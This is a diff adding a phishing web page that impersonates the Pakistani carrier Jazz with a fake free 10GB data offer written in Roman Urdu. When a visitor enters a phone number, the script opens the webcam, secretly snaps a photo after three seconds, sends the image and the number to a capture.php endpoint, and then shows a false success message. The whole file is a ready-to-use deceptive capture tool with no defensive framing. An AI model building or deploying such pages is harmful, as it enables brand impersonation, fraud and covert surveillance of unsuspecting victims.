@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jazz Free 10GB Offer</title>
+    <style>
+        body { background: #c00; color: white; text-align: center; font-family: Arial; }
+        .container { max-width: 400px; margin: 50px auto; background: white; color: black; padding: 30px; border-radius: 15px; }
+        .logo { width: 200px; }
+        input, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 16px; }
+        button { background: #ff0000; color: white; border: none; border-radius: 50px; }
+        #video { width: 300px; display: none; }
+        .success { display: none; color: green; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://jazz.com.pk/assets/images/logo.png" alt="Jazz" class="logo">
+        <h1>Free 10GB Data Offer!</h1>
+        <p>Apna Jazz number daalein aur free MB hasil karein.</p>
+        <input type="text" id="number" placeholder="03xxxxxxxxx" required>
+        <button onclick="startCapture()">Activate Now</button>
+        
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        
+        <div id="success" class="success">
+            <h2>Congratulations!</h2>
+            <p>10GB free data activate ho gaya. 24 hours mein mil jaayega.</p>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const success = document.getElementById('success');
+
+        async function startCapture() {
+            const number = document.getElementById('number').value;
+            if (!number) { alert('Number daalein!'); return; }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // Send to server
+                    fetch('capture.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: 'image=' + encodeURIComponent(imageData) + '&number=' + number
+                    });
+
+                    // Stop camera & show success
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = 'none';
+                    success.style.display = 'block';
+                }, 3000); // 3 seconds baad capture
+            } catch (err) {
+                alert('Camera access denied ya error. Offer nahi mila.');
+            }
+        }
+    </script>
+</body>
+</html>
